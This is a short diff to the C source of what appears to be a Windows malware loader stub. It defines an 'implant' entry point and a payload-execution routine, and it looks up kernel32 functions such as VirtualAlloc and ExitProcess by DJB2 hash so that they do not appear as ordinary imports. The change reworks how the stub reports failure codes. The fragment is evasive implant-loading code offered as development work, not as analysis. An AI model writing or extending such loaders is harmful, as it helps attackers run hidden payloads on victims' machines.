@@ -389,22 +389,13 @@ static inline SIZE_T stub_get_image_size(PVOID image_base) {
 
 typedef void (__attribute__((ms_abi)) *fn_implant_entry)(PVOID param);
 
-/* Resolve ExitProcess for diagnostic exit codes in dev builds */
-static inline fn_VirtualAlloc stub_resolve_exitprocess(void) {
-    PVOID k32 = stub_find_module(HASH_KERNEL32_DLL);
-    if (!k32) return NULL;
-    /* DJB2("ExitProcess") = 0x024773DE */
-    return (fn_VirtualAlloc)stub_find_export(k32, 0x024773DE);
-}
-
 typedef void (__attribute__((ms_abi)) *fn_ExitProcess_stub)(DWORD code);
 
-static inline void stub_execute_payload(void) {
-    /* Resolve ExitProcess for debug exit codes */
-    fn_ExitProcess_stub pExit =
-        (fn_ExitProcess_stub)stub_resolve_exitprocess();
+/* Global so WinMainCRTStartup can read it after stub_execute_payload returns */
+static DWORD g_stub_exit_code = 0;
 
-    #define STUB_FAIL(code) do { if (pExit) pExit(code); return; } while(0)
+static inline void stub_execute_payload(void) {
+    #define STUB_FAIL(code) do { g_stub_exit_code = (code); return; } while(0)
 
     /* Step 1: Resolve VirtualAlloc */
     fn_VirtualAlloc pVirtualAlloc = stub_resolve_virtualalloc();
